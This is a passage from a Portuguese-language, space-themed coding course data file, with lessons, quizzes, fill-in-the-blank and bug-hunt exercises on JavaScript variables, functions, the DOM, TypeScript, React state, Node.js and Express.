              'Porque variáveis "const" rodam 10 vezes mais rápido na CPU.',
              'Porque "const" previne reatribuições acidentais de valor, tornando o código mais previsível e seguro.',
              'Porque "let" não funciona em navegadores modernos.',
              'Porque "const" permite criar variáveis sem nenhum valor inicial.'
            ],
            correctIndex: 1,
            explanation: 'Usar const por padrão expressa intenção clara de que aquele valor é estável, prevenindo bugs onde uma variável é sobrescrita acidentalmente em outra parte do código.'
          },
          {
            type: 'fillblank',
            title: 'Cálculo de Energia da Estação',
            instruction: 'Complete a declaração da constante do piloto e a variável reatribuível de nível de energia.',
            codeSnippet: `{{declarador_imutavel}} comandante = "Aria";
{{declarador_mutavel}} nivelBateria = 100;
nivelBateria = 90;`,
            blanks: [
              {
                id: 'declarador_imutavel',
                placeholder: 'palavra-chave imutável',
                expectedValues: ['const'],
                hint: 'Palavra-chave usada para variáveis que nunca serão reatribuídas.'
              },
              {
                id: 'declarador_mutavel',
                placeholder: 'palavra-chave mutável',
                expectedValues: ['let'],
                hint: 'Palavra-chave usada quando a variável precisa ter seu valor alterado depois.'
              }
            ],
            explanation: 'Perfeito! Usar const para o comandante e let para a bateria reflete as melhores práticas de JavaScript moderno.'
          },
          {
            type: 'bughunt',
            title: 'Sobrecarga no Gerador Quântico',
            scenario: 'O robô de telemetria tentou incrementar a pontuação de XP do jogador, mas o console acusou "TypeError: Assignment to constant variable".',
            buggyCode: `const xpJogador = 50;
xpJogador = xpJogador + 25;
console.log(xpJogador);`,
            expectedKeywords: ['let xpJogador = 50;', 'xpJogador = xpJogador + 25;'],
            forbiddenKeywords: ['const xpJogador = 50;'],
            hint: 'A variável xpJogador está sendo reatribuída na linha seguinte. Qual palavra-chave permite que o valor mude?',
            solutionExplanation: 'Excelente depuração! Trocando const por let na declaração inicial, a variável agora pode receber novos valores sem estourar erros de runtime.'
          }
        ]
      },
      {
        id: 'js-2',
        title: '2. Funções Quânticas & Lógica de Decisão',
        description: 'Construa blocos de código reutilizáveis com funções, arrow functions e operadores lógicos.',
        duration: 16,
        xpReward: 65,
        language: 'javascript',
        content: `# 🧠 Funções & Lógica de Decisão

Funções são os motores de ação do JavaScript. Em vez de repetir linhas de cálculo dez vezes, você encapsula a lógica dentro de uma função e a executa sempre que necessário.

---

### ⚙️ Declarando Funções no JavaScript

Existem duas formas principais de escrever funções:

1. **Função Tradicional (\`function\`):**
   \`\`\`javascript
   function calcularDano(ataque, defesa) {
     return ataque - defesa;
   }
   \`\`\`
2. **Arrow Function (\`=>\`):** A sintaxe mais enxuta introduzida no ES6:
   \`\`\`javascript
   const calcularDano = (ataque, defesa) => {
     return ataque - defesa;
   };
   \`\`\`
   Se a função tiver apenas uma instrução de retorno, você pode omitir as chaves e a palavra \`return\`:
   \`\`\`javascript
   const dobrar = (n) => n * 2;
   \`\`\`

---

### 🔀 Tomada de Decisão: \`if\`, \`else\` & Operador Ternário

O computador decide caminhos com base em condições booleanas:

\`\`\`javascript
if (energia >= 50) {
  ativarPropulsores();
} else if (energia > 10) {
  ativarModoEconomia();
} else {
  ativarSinalSocorro();
}
\`\`\`

Para decisões simples de atribuição, use o **operador ternário**:

\`\`\`javascript
const status = energia > 20 ? "Operacional" : "Crítico";
\`\`\`

> **💡 Dica Pro:**
> Funções puras (que recebem argumentos e retornam um resultado sem modificar variáveis externas) são muito mais fáceis de testar e debugar. Sempre que puder, faça suas funções retornarem valores com \`return\` em vez de alterar o mundo lá fora.

> **⚠️ Armadilha Comum:**
> Esquecer a palavra \`return\` dentro de uma função que usa chaves faz com que ela retorne \`undefined\` por padrão!`,
        codeExample: `// Sistema de Autorização de Salto Hiperespacial
const verificarAutorizacao = (credencial, nivelEnergia) => {
  if (credencial === "OFICIAL" && nivelEnergia >= 80) {
    return "SALTO_AUTORIZADO";
  }
  return "SALTO_NEGADO";
};

const resultado = verificarAutorizacao("OFICIAL", 95);
console.log(resultado); // "SALTO_AUTORIZADO"`,
        exercises: [
          {
            type: 'quiz',
            question: 'O que uma função JavaScript retorna por padrão se o corpo da função terminar sem executar nenhum comando "return"?',
            options: [
              'Retorna o número 0.',
              'Retorna uma string vazia "".',
              'Retorna o valor especial undefined.',
              'Dispara um erro fatal de compilação.'
            ],
            correctIndex: 2,
            explanation: 'No JavaScript, qualquer função que não especifique explicitamente um valor de retorno devolve undefined por definição da linguagem.'
          },
          {
            type: 'code',
            instruction: 'Crie uma função chamada calcularBonus que recebe um parâmetro pontuacao. Se pontuacao for maior ou igual a 100, retorne 50. Caso contrário, retorne 10.',
            initialCode: `// Escreva a função calcularBonus abaixo\n`,
            expectedKeywords: ['function calcularBonus', 'pontuacao', 'return', '50', '10'],
            hint: 'Declare a função com function calcularBonus(pontuacao) {. Use if (pontuacao >= 100) return 50; else return 10;.',
            solution: `function calcularBonus(pontuacao) {
  if (pontuacao >= 100) {
    return 50;
  }
  return 10;
}`
          },
          {
            type: 'bughunt',
            title: 'O Scanner Sem Retorno',
            scenario: 'O scanner de radar deveria devolver a distância calculada, mas quem chama a função sempre recebe undefined.',
            buggyCode: `function escanearAlvo(coordenadaX, coordenadaY) {
  const distancia = Math.sqrt(coordenadaX ** 2 + coordenadaY ** 2);
  // O valor foi calculado, mas nunca devolvido!
}

const resultado = escanearAlvo(3, 4);
console.log(resultado);`,
            expectedKeywords: ['return distancia;'],
            forbiddenKeywords: ['// O valor foi calculado, mas nunca devolvido!'],
            hint: 'Adicione a palavra-chave de retorno na última linha da função para enviar a variável distancia de volta a quem a chamou.',
            solutionExplanation: 'Perfeito! Com return distancia;, a função agora entrega o resultado do cálculo para a variável que a invocou.'
          }
        ]
      },
      {
        id: 'js-3',
        title: '3. Interatividade Viva: O DOM & Eventos',
        description: 'Aprenda a selecionar elementos HTML e responder a cliques e ações do usuário.',
        duration: 17,
        xpReward: 65,
        language: 'javascript',
        content: `# ⚡ Interatividade Viva: O DOM & Eventos

Até agora seu código executou cálculos internos. Chegou o momento mais empolgante: **fazer o JavaScript controlar os elementos visuais na tela**!

---

### 🌲 O que é o DOM (Document Object Model)?

O **DOM** é a representação em árvore que o navegador cria para cada tag HTML da sua página. No JavaScript, você pode acessar e manipular essa árvore usando o objeto global \`document\`.

Para encontrar qualquer elemento usando a mesma sintaxe de seletores do CSS:

\`\`\`javascript
const botao = document.querySelector("#btn-lancar");
const titulo = document.querySelector(".titulo-missao");
\`\`\`

---

### 👂 Escutando Ações com \`addEventListener\`

Para responder a um clique do mouse, pressionamento de tecla ou envio de formulário, registramos um ouvinte de eventos:

\`\`\`javascript
const botao = document.querySelector("#btn-lancar");

botao.addEventListener("click", () => {
  console.log("Foguete lançado!");
  titulo.textContent = "Missão em Andamento!";
});
\`\`\`

---

### 🎨 Alterando Textos e Estilos Dinamicamente

Com o elemento em mãos, você tem superpoderes:

- **Alterar texto:** \`elemento.textContent = "Novo texto seguro";\`
- **Adicionar classe CSS:** \`elemento.classList.add("ativo");\`
- **Remover classe CSS:** \`elemento.classList.remove("oculto");\`
- **Alternar classe CSS:** \`elemento.classList.toggle("modo-escuro");\`

> **💡 Dica Pro:**
> Sempre prefira alterar classes CSS via \`classList.add()\` ou \`toggle()\` em vez de alterar estilos inline com \`style.color\`. Isso mantém o CSS responsável pelo visual e o JavaScript responsável pelo comportamento.

> **⚠️ Armadilha Comum:**
> Tentar buscar um elemento com \`querySelector\` antes do HTML ser carregado pelo navegador resulta em \`null\`. Coloque suas tags \`<script>\` antes de fechar o \`</body>\` ou use o atributo \`defer\`.`,
        codeExample: `// Interceptando a Ignição do Reator
const botaoIgnicao = document.querySelector("#botao-ignicao");
const statusLuz = document.querySelector(".status-luz");

botaoIgnicao.addEventListener("click", () => {
  statusLuz.textContent = "REATOR ONLINE";
  statusLuz.classList.add("ativo");
});`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual método moderno da API DOM é o mais flexível e recomendado para capturar o primeiro elemento que coincida com um seletor CSS?',
            options: [
              'document.getElementByIdName()',
              'document.querySelector()',
              'document.captureElement()',
              'document.findCss()'
            ],
            correctIndex: 1,
            explanation: 'document.querySelector() permite usar qualquer seletor CSS válido (.classe, #id, tag[attr], etc.) para capturar elementos na página com máxima flexibilidade.'
          },
          {
            type: 'fillblank',
            title: 'Ativando o Alarme da Estação',
            instruction: 'Preencha os métodos para capturar o botão por ID e registrar o ouvinte de evento de clique.',
            codeSnippet: `const botaoAlarme = document.{{metodo_selecao}}("#btn-alarme");

botaoAlarme.{{metodo_ouvinte}}("click", () => {
  alert("Alerta vermelho ativado!");
});`,
            blanks: [
              {
                id: 'metodo_selecao',
                placeholder: 'método seletor',
                expectedValues: ['querySelector'],
                hint: 'Método padrão do objeto document que aceita seletores CSS.'
              },
              {
                id: 'metodo_ouvinte',
                placeholder: 'método ouvinte',
                expectedValues: ['addEventListener'],
                hint: 'Método chamado no elemento para escutar eventos.'
              }
            ],
            explanation: 'Magnífico! document.querySelector e addEventListener são a dupla dinâmica do desenvolvimento web moderno!'
          },
          {
            type: 'code',
            instruction: 'Escreva o código para adicionar um ouvinte de clique ao elemento botao, mudando a propriedade textContent do elemento status para "SISTEMA ATIVO".',
            initialCode: `// Considere que as variáveis "botao" e "status" já existem
// Adicione o addEventListener abaixo\n`,
            expectedKeywords: ['botao.addEventListener', 'click', 'status.textContent', 'SISTEMA ATIVO'],
            hint: 'Faça botao.addEventListener("click", () => { status.textContent = "SISTEMA ATIVO"; });',
            solution: `botao.addEventListener("click", () => {
  status.textContent = "SISTEMA ATIVO";
});`
          }
        ]
      }
    ],
  },
  {
    id: 'typescript',
    slug: 'typescript',
    name: 'TypeScript',
    planetName: 'Quantum Station',
    description: 'Adicione blindagem estática de tipos e segurança corporativa ao JavaScript.',
    icon: '🔷',
    color: '#3178C6',
    language: 'typescript',
    level: 'Intermediário',
    totalXp: 125,
    lessons: [
      {
        id: 'ts-1',
        title: '1. O Escudo dos Tipos: Primitivos & Funções',
        description: 'Elimine bugs antes mesmo de rodar o código com tipagem estática e inferência.',
        duration: 15,
        xpReward: 60,
        language: 'typescript',
        content: `# 🔷 O Escudo dos Tipos: Primitivos & Funções

Bem-vindo à **Quantum Station**, cadete! No vasto cosmos do software, um dos maiores causadores de catástrofes em produção é o famoso \`TypeError: undefined is not a function\`.

O **TypeScript** é um superset do JavaScript desenvolvido pela Microsoft que adiciona uma camada de **blindagem estática de tipos**.

> **💡 O que é TypeScript?**
> O TypeScript não substitui o JavaScript — ele o envolve com um sistema de checagem em tempo de desenvolvimento. Antes do seu código ir para o ar, o compilador verifica cada variável, função e objeto. Se houver incompatibilidade, você descobre no editor, não na frente do usuário!

---

### 🛡️ Tipagem Primitiva Explícita

\`\`\`typescript
const nomeNave: string = "USS Voyager";
let tripulantes: number = 140;
let escudosAtivos: boolean = true;
\`\`\`

---

### ⚙️ Tipando Funções: Parâmetros & Retorno

No TypeScript, você define os tipos dos argumentos que entram e o tipo do valor que sai da função:

\`\`\`typescript
function calcularPropulsao(velocidade: number, fatorDobra: number): number {
  return velocidade * fatorDobra;
}
\`\`\`

Se a função apenas executa uma ação e não retorna nenhum valor, o tipo de retorno é \`void\`:

\`\`\`typescript
function emitirAlerta(mensagem: string): void {
  console.warn(\`ALERTA: \${mensagem}\`);
}
\`\`\`

> **⚠️ Armadilha Comum:**
> Usar o tipo \`any\` desliga completamente a checagem do TypeScript! É como voar no espaço sem capacete. Evite \`any\` sempre que possível; prefira tipos explícitos ou \`unknown\`.

> **🛡️ Boa Prática:**
> O TypeScript possui **inferência de tipos**. Se você declarar \`let pontuacao = 100;\`, ele já sabe automaticamente que a variável é do tipo \`number\`. Não é necessário tipar o que é óbvio!`,
        codeExample: `// Sistema de Calibração da Quantum Station
function autenticarOficial(id: string, nivelSeguranca: number): boolean {
  if (nivelSeguranca >= 4) {
    return true;
  }
  return false;
}

const autorizado: boolean = autenticarOficial("CADETE-99", 5);
console.log("Acesso concedido:", autorizado);`,
        exercises: [
          {
            type: 'quiz',
            question: 'O que acontece com as anotações de tipo do TypeScript quando o código é compilado para ser executado em produção no navegador?',
            options: [
              'São convertidas em funções de validação em tempo de execução que deixam a página mais lenta.',
              'São completamente removidas durante o processo de build, gerando JavaScript puro e limpo.',
              'São enviadas para um servidor remoto da Microsoft que valida cada requisição.',
              'São mantidas dentro de comentários invisíveis no HTML.'
            ],
            correctIndex: 1,
            explanation: 'O TypeScript é uma ferramenta de tempo de desenvolvimento. Na compilação (transpilação), todos os tipos são eliminados ("type erasure"), resultando em JavaScript padrão compatível com qualquer navegador.'
          },
          {
            type: 'fillblank',
            title: 'Tipando a Missão Espacial',
            instruction: 'Preencha os tipos do parâmetro nivel (número) e do retorno da função (texto).',
            codeSnippet: `function classificarPiloto(nivel: {{tipo_numero}}): {{tipo_retorno}} {
  if (nivel >= 50) return "Comandante";
  return "Cadete";
}`,
            blanks: [
              {
                id: 'tipo_numero',
                placeholder: 'tipo numérico',
                expectedValues: ['number'],
                hint: 'Palavra-chave em minúsculas que representa números no TypeScript.'
              },
              {
                id: 'tipo_retorno',
                placeholder: 'tipo textual',
                expectedValues: ['string'],
                hint: 'Palavra-chave que representa textos no TypeScript.'
              }
            ],
            explanation: 'Excelente! A função agora tem contrato rígido: recebe um number e promete devolver uma string.'
          },
          {
            type: 'bughunt',
            title: 'Incompatibilidade na Matriz de Coordenadas',
            scenario: 'O compilador acusou erro porque alguém passou uma string entre aspas onde a função esperava estritamente um número.',
            buggyCode: `function ajustarOrbita(graus: number): void {
  console.log("Órbita ajustada em", graus, "graus.");
}

// Erro de tipo na chamada abaixo:
ajustarOrbita("45");`,
            expectedKeywords: ['ajustarOrbita(45);'],
            forbiddenKeywords: ['ajustarOrbita("45");'],
            hint: 'Remova as aspas ao redor do número 45 para que ele seja tratado como um número literal válido.',
            solutionExplanation: 'Perfeito! O valor 45 sem aspas é do tipo number, satisfazendo a assinatura exigida pela função.'
          }
        ]
      },
      {
        id: 'ts-2',
        title: '2. Interfaces & Modelagem Quântica',
        description: 'Defina a forma dos seus objetos com interfaces, propriedades opcionais e Union Types.',
        duration: 16,
        xpReward: 65,
        language: 'typescript',
        content: `# 🧬 Interfaces & Modelagem Quântica

Conforme seus sistemas crescem, você precisará modelar entidades complexas: usuários, naves espaciais, planos de voo. No TypeScript, usamos **interfaces** como contratos de arquitetura.

---

### 🏛️ Criando uma Interface

Uma \`interface\` declara quais propriedades um objeto deve possuir e de que tipo elas são:

\`\`\`typescript
interface CadeteEspacial {
  id: string;
  nome: string;
  nivel: number;
  ativo: boolean;
  moduloEspecial?: string; // Propriedade opcional com "?"
}
\`\`\`

---

### ❓ Propriedades Opcionais (\`?\`)

Nem todo objeto possui todos os campos o tempo todo. Ao adicionar um ponto de interrogação antes dos dois pontos (\`?\`), você torna o campo opcional:

\`\`\`typescript
const novoCadete: CadeteEspacial = {
  id: "C-101",
  nome: "Lucas",
  nivel: 1,
  ativo: true
  // moduloEspecial não é obrigatório aqui!
};
\`\`\`

---

### 🔀 Union Types: Restringindo Valores Possíveis

Em vez de permitir qualquer texto, você pode criar uma união estrita de opções:

\`\`\`typescript
type StatusMissao = "PENDENTE" | "EM_PROGRESSO" | "CONCLUIDA" | "FALHA";

let statusAtual: StatusMissao = "PENDENTE";
// statusAtual = "CANCELADA"; // ERRO! Não faz parte do tipo!
\`\`\`

> **💡 Dica Pro:**
> Use interfaces para definir a estrutura de objetos e modelos de dados da sua aplicação. Elas suportam extensão (\`extends\`) para herança limpa entre tipos.

> **⚠️ Armadilha Comum:**
> Tentar instanciar um objeto esquecendo uma propriedade obrigatória da interface gerará um erro do compilador antes mesmo de você rodar o projeto.`,
        codeExample: `// Modelagem de Veículo Espacial
interface NaveExploracao {
  codigo: string;
  capacidadeTripulantes: number;
  escudoAtivo: boolean;
  armaSecundaria?: string;
}

const navePrincipal: NaveExploracao = {
  codigo: "NEXUS-PRIME",
  capacidadeTripulantes: 8,
  escudoAtivo: true
};

console.log("Nave pronta:", navePrincipal.codigo);`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual o significado do ponto de interrogação (?) após o nome de uma propriedade em uma interface TypeScript (ex: telefone?: string)?',
            options: [
              'Indica que a propriedade é secreta e criptografada no banco de dados.',
              'Indica que a propriedade é opcional, podendo estar ausente no objeto.',
              'Indica que a propriedade aceita qualquer tipo de dado arbitrário.',
              'Indica que a propriedade só pode ser lida, mas nunca alterada.'
            ],
            correctIndex: 1,
            explanation: 'O operador ? marca a propriedade como opcional, significando que o objeto pode ser instanciado validamente com ou sem aquele campo.'
          },
          {
            type: 'code',
            instruction: 'Defina uma interface chamada ModuloNave com as propriedades obrigatórias id (string), potencia (number) e ativa (boolean).',
            initialCode: `// Defina a interface abaixo\n`,
            expectedKeywords: ['interface ModuloNave', 'id: string', 'potencia: number', 'ativa: boolean'],
            hint: 'Inicie com interface ModuloNave {. Em seguida adicione id: string;, potencia: number; e ativa: boolean;.',
            solution: `interface ModuloNave {
  id: string;
  potencia: number;
  ativa: boolean;
}`
          }
        ]
      }
    ],
  },
  {
    id: 'react',
    slug: 'react',
    name: 'React',
    planetName: 'React Nexus',
    description: 'Construa interfaces reativas, declarativas e componentes modulares reutilizáveis.',
    icon: '⚛️',
    color: '#61DAFB',
    language: 'tsx',
    level: 'Intermediário',
    totalXp: 130,
    lessons: [
      {
        id: 'react-1',
        title: '1. Componentes Modulares, JSX & Props',
        description: 'Aprenda a pensar em componentes reutilizáveis e passar dados com propriedades.',
        duration: 15,
        xpReward: 65,
        language: 'tsx',
        content: `# ⚛️ Componentes Modulares, JSX & Props

Bem-vindo a **React Nexus**! No desenvolvimento web tradicional, páginas eram escritas como blocos monolíticos de centenas de linhas.

O **React**, criado pelo time de engenharia do Facebook/Meta, revolucionou a indústria com um conceito simples e genial: **dividir a interface em pequenos componentes independentes e reutilizáveis** (como blocos de LEGO).

---

### 🧩 O que é um Componente React?

Um componente no React nada mais é do que uma **função JavaScript que retorna marcação visual (JSX)**:

\`\`\`tsx
function BotaoDisparo() {
  return (
    <button className="btn-neon">
      Ativar Propulsor
    </button>
  );
}
\`\`\`

---

### 📦 O que é JSX?

**JSX** significa *JavaScript XML*. Ele permite escrever marcação semelhante a HTML diretamente dentro de funções JavaScript.

Principais diferenças em relação ao HTML comum:
1. Usamos \`className\` em vez de \`class\` (porque \`class\` é uma palavra reservada do JavaScript!).
2. Todas as tags devem ser fechadas rigorosamente (ex: \`<img />\`, \`<input />\`, \`<br />\`).
3. Expressões dinâmicas JavaScript ficam entre chaves: \`<h1>{nomeDoCadete}</h1>\`.

---

### 📬 Passando Dados com \`props\`

Componentes tornam-se verdadeiramente poderosos quando são customizáveis através de **props** (parâmetros de entrada):

\`\`\`tsx
interface CardMissaoProps {
  titulo: string;
  recompensaXp: number;
}

function CardMissao({ titulo, recompensaXp }: CardMissaoProps) {
  return (
    <div className="card-missao">
      <h3>{titulo}</h3>
      <p>Recompensa: +{recompensaXp} XP</p>
    </div>
  );
}
\`\`\`

> **💡 Dica Pro:**
> Nomes de componentes React devem começar sempre com **letra maiúscula** (ex: \`PainelControle\`). Se começar com minúscula, o React acha que se trata de uma tag HTML nativa!

> **⚠️ Armadilha Comum:**
> Esquecer de importar o componente ou tentar retornar múltiplos elementos raiz sem envolvê-los em uma tag pai ou em um Fragment vazio (\`<>...</>\`).`,
        codeExample: `// Componente de Badge de Status da Estação
interface StatusBadgeProps {
  status: "ONLINE" | "OFFLINE";
}

export function StatusBadge({ status }: StatusBadgeProps) {
  const isOnline = status === "ONLINE";

  return (
    <span className={isOnline ? "badge-verde" : "badge-vermelho"}>
      {isOnline ? "● Sistema Online" : "○ Sistema Offline"}
    </span>
  );
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'Por que no JSX do React utilizamos o atributo "className" em vez de "class" para aplicar classes de estilo CSS?',
            options: [
              'Porque className é mais rápido para o compilador interpretar.',
              'Porque "class" é uma palavra reservada do JavaScript para declaração de classes orientadas a objetos.',
              'Porque o navegador Google Chrome proíbe o uso de class em bibliotecas modernas.',
              'Porque className adiciona suporte automático a CSS inline.'
            ],
            correctIndex: 1,
            explanation: 'Como o JSX é transformado em JavaScript puro por trás dos panos, usar a palavra-chave class geraria conflito com a sintaxe de classes ES6 do JavaScript.'
          },
          {
            type: 'code',
            instruction: 'Crie um componente funcional chamado BotaoNexus que recebe a prop { rotulo }: { rotulo: string } e retorna um botão com classe "btn-nexus" exibindo o rotulo.',
            initialCode: `// Crie o componente BotaoNexus abaixo\n`,
            expectedKeywords: ['function BotaoNexus', 'rotulo', 'className="btn-nexus"', '{rotulo}', '</button>'],
            hint: 'Escreva function BotaoNexus({ rotulo }: { rotulo: string }) { return <button className="btn-nexus">{rotulo}</button>; }.',
            solution: `function BotaoNexus({ rotulo }: { rotulo: string }) {
  return <button className="btn-nexus">{rotulo}</button>;
}`
          },
          {
            type: 'bughunt',
            title: 'Sintaxe Corrompida no JSX do Card',
            scenario: 'O desenvolvedor júnior tentou criar o card do piloto, mas cometeu dois erros clássicos de JSX: usou "class" em vez de "className" e esqueceu de fechar a tag de imagem.',
            buggyCode: `function CardPiloto() {
  return (
    <div class="card-piloto">
      <h2>Comandante</h2>
      <img src="avatar.png" alt="Avatar">
    </div>
  );
}`,
            expectedKeywords: ['className="card-piloto"', '<img src="avatar.png" alt="Avatar" />'],
            forbiddenKeywords: ['class="card-piloto"', '<img src="avatar.png" alt="Avatar">'],
            hint: 'Substitua class por className na div e feche a tag de imagem com uma barra no final (ex: <img ... />).',
            solutionExplanation: 'Show de bola! Com className e a tag de imagem com fechamento automático (<img ... />), o JSX volta a ser 100% válido no React.'
          }
        ]
      },
      {
        id: 'react-2',
        title: '2. O Pulso do Componente: Estado com useState',
        description: 'Faça seus componentes reagirem dinamicamente a cliques e interações do usuário.',
        duration: 16,
        xpReward: 65,
        language: 'tsx',
        content: `# 💓 O Pulso do Componente: Estado com useState

Componentes estáticos são úteis, mas a verdadeira mágica do React acontece quando as telas **reagem** às ações dos usuários: contadores que sobem, modais que abrem, formulários que validam.

Para guardar informações mutáveis dentro de um componente, usamos o **Hook \`useState\`**.

---

### 🎣 Anatomia do \`useState\`

\`\`\`tsx
import { useState } from 'react';

function PainelEscudo() {
  const [escudos, setEscudos] = useState(100);

  const tomarDano = () => {
    setEscudos(escudos - 15);
  };

  return (
    <div>
      <p>Nível dos Escudos: {escudos}%</p>
      <button onClick={tomarDano}>Receber Impacto</button>
    </div>
  );
}
\`\`\`

O \`useState\` devolve um array com exatamente 2 itens:
1. **O valor atual do estado** (\`escudos\`).
2. **A função atualizadora** (\`setEscudos\`), que avisa ao React que o dado mudou e aciona a re-renderização da tela!

---

### 🛡️ Regra Inegociável: Imutabilidade

Você **NUNCA** deve alterar a variável de estado diretamente:

\`\`\`tsx
// ❌ PROIBIDO: O React não detecta a mudança e a tela não atualiza!
escudos = 50;

// ✅ CORRETO: Chama a função atualizadora
setEscudos(50);
\`\`\`

> **💡 Dica Pro:**
> Quando o próximo estado depende do estado anterior, use uma função de atualização: \`setContador(prev => prev + 1)\`. Isso evita bugs de concorrência!

> **⚠️ Armadilha Comum:**
> Chamar a função atualizadora diretamente no corpo do componente (fora de um evento ou \`useEffect\`) causa um loop infinito de renderização fatal.`,
        codeExample: `import { useState } from 'react';

export function ContadorMissoes() {
  const [concluidas, setConcluidas] = useState(0);

  return (
    <div className="painel-missoes">
      <h3>Missões Concluídas: {concluidas}</h3>
      <button onClick={() => setConcluidas(concluidas + 1)}>
        +1 Missão Finalizada
      </button>
    </div>
  );
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'Por que não devemos modificar uma variável de estado diretamente no React (ex: contador = 5) em vez de usar setContador(5)?',
            options: [
              'Porque variáveis no React são protegidas contra gravação pelo navegador.',
              'Porque o React só detecta alterações e dispara a atualização visual da tela quando usamos a função atualizadora.',
              'Porque modificar variáveis diretamente trava a placa de vídeo do computador.',
              'Porque o React só aceita valores booleanos no estado.'
            ],
            correctIndex: 1,
            explanation: 'O React monitora as chamadas à função atualizadora para recalcular o DOM virtual e atualizar os pixels certos na tela com máxima eficiência.'
          },
          {
            type: 'fillblank',
            title: 'Configurando o Estado dos Propulsores',
            instruction: 'Complete a desestruturação do hook useState para gerenciar o estado da potência dos propulsores.',
            codeSnippet: `const [potencia, {{funcao_atualizadora}}] = useState(50);`,
            blanks: [
              {
                id: 'funcao_atualizadora',
                placeholder: 'função atualizadora',
                expectedValues: ['setPotencia', 'setPotência'],
                hint: 'Por convenção universal no React, a função atualizadora usa o prefixo "set" seguido do nome da variável em CamelCase.'
              }
            ],
            explanation: 'Exato! A convenção [valor, setValor] é um dos padrões mais reconhecíveis do ecossistema React mundial.'
          }
        ]
      }
    ],
  },
  {
    id: 'nodejs',
    slug: 'nodejs',
    name: 'Node.js',
    planetName: 'Backend Colony',
    description: 'Execute JavaScript no servidor e construa APIs escaláveis e velozes.',
    icon: '🟢',
    color: '#339933',
    language: 'javascript',
    level: 'Intermediário',
    totalXp: 125,
    lessons: [
      {
        id: 'node-1',
        title: '1. O Motor do Servidor & Arquitetura Assíncrona',
        description: 'Entenda como o runtime Node.js executa JavaScript de alta performance fora do browser.',
        duration: 15,
        xpReward: 60,
        language: 'javascript',
        content: `# 🟢 O Motor do Servidor: Node.js

Bem-vindo à **Backend Colony**, a base de infraestrutura que sustenta todos os sistemas da frota!

Durante quase 15 anos, o JavaScript esteve confinado dentro das janelas dos navegadores. Em 2009, Ryan Dahl pegou a engine **V8** do Google Chrome e a uniu a um sistema de entrada/saída assíncrono para criar o **Node.js**: o JavaScript agora domina os servidores!

---

### ⚡ O Segredo da Performance: Event Loop Não Bloqueante

Em servidores tradicionais (como PHP clássico ou Apache), cada usuário conectado ocupa uma nova thread pesada do sistema operacional. Se 1.000 usuários fizerem consultas lentas, o servidor esgota a memória.

O Node.js adota uma arquitetura diferente:
- **Single-Threaded:** Opera com uma thread principal para execução lógica.
- **Não-Bloqueante (Non-blocking I/O):** Quando você pede um arquivo do disco ou consulta o banco de dados, o Node entrega o trabalho para o sistema operacional em segundo plano e continua atendendo outros usuários imediatamente!

---

### 📦 Modularidade: CommonJS vs ESM

No Node moderno, usamos o padrão oficial **ES Modules** (\`import\` / \`export\`):

\`\`\`javascript
import fs from 'fs/promises';

async function lerRegistro() {
  const log = await fs.readFile('telemetria.log', 'utf-8');
  console.log(log);
}
\`\`\`

> **💡 Dica Pro:**
> Adicione \`"type": "module"\` no seu arquivo \`package.json\` para usar nativamente a sintaxe \`import/export\` sem precisar de ferramentas de build complexas.

> **⚠️ Armadilha Comum:**
> Executar operações síncronas pesadas (como \`fs.readFileSync\`) em rotas de produção congela a thread principal e impede o servidor de responder a qualquer outro usuário até o fim da leitura!`,
        codeExample: `// Servidor HTTP Nativo do Node.js
import http from 'http';

const servidor = http.createServer((requisicao, resposta) => {
  resposta.writeHead(200, { 'Content-Type': 'application/json' });
  resposta.end(JSON.stringify({ status: 'BASE_OPERACIONAL', cadetesOnline: 42 }));
});

servidor.listen(3000, () => {
  console.log('Servidor da Backend Colony escutando na porta 3000!');
});`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual é a principal característica da arquitetura do Node.js que permite atender milhares de requisições concorrentes de forma ultrarrápida?',
            options: [
              'Criar uma nova thread física na CPU para cada requisição recebida.',
              'Modelo de E/S assíncrono e não-bloqueante baseado em um Event Loop de thread única.',
              'Compilar o código diretamente para linguagem Assembly proprietária da IBM.',
              'Executar apenas em computadores quânticos de alta voltagem.'
            ],
            correctIndex: 1,
            explanation: 'O modelo de I/O não-bloqueante delega operações lentas (leitura de arquivos, banco de dados, rede) em background, mantendo o Event Loop sempre livre para receber novas conexões.'
          },
          {
            type: 'fillblank',
            title: 'Inicializando o Servidor HTTP',
            instruction: 'Preencha a porta onde o servidor da colônia escutará as conexões recebidas.',
            codeSnippet: `const PORTA = 3000;
servidor.{{metodo_escuta}}(PORTA, () => {
  console.log("Servidor ativo na porta", PORTA);
});`,
            blanks: [
              {
                id: 'metodo_escuta',
                placeholder: 'método para escutar',
                expectedValues: ['listen'],
                hint: 'Palavra em inglês que significa "escutar" ou "ouvir".'
              }
            ],
            explanation: 'Perfeito! O método listen(porta) coloca o servidor Node.js em modo de escuta contínua na porta de rede informada.'
          }
        ]
      },
      {
        id: 'node-2',
        title: '2. Criando APIs REST com Express',
        description: 'Construa rotas, receba requisições JSON e responda com códigos de status HTTP apropriados.',
        duration: 16,
        xpReward: 65,
        language: 'javascript',
        content: `# 🚀 APIs REST com Express

Embora o módulo HTTP nativo do Node funcione, no dia a dia da indústria usamos **frameworks web** para criar rotas limpas, autenticação e middlewares. O **Express** é o líder absoluto desse ecossistema.

---

### 🛣️ O que é uma API REST?

Uma **API REST** permite que diferentes sistemas (aplicativos móveis, páginas web, relógios inteligentes) conversem através do protocolo HTTP padrão da web:

- \`GET /api/missoes\`: Buscar informações.
- \`POST /api/missoes\`: Criar um novo recurso.
- \`PUT /api/missoes/:id\`: Atualizar um recurso existente.
- \`DELETE /api/missoes/:id\`: Remover um recurso.

---

### 📦 Criando um Servidor Express em 10 Linhas

\`\`\`javascript
import express from 'express';

const app = express();
app.use(express.json()); // Permite ler o corpo das requisições em formato JSON!

app.get('/api/status', (req, res) => {
  res.status(200).json({ status: 'Online', sistema: 'Nexus Core' });
});

app.post('/api/cadetes', (req, res) => {
  const { nome } = req.body;
  res.status(201).json({ mensagem: \`Cadete \${nome} registrado!\` });
});

app.listen(3000);
\`\`\`

---

### 🚦 Códigos de Status HTTP Que Todo Desenvolvedor Deve Saber

- **200 OK:** Sucesso padrão para leitura ou atualização.
- **201 Created:** Sucesso ao criar um novo registro no banco.
- **400 Bad Request:** O cliente enviou dados inválidos ou incompletos.
- **404 Not Found:** O recurso solicitado não existe.
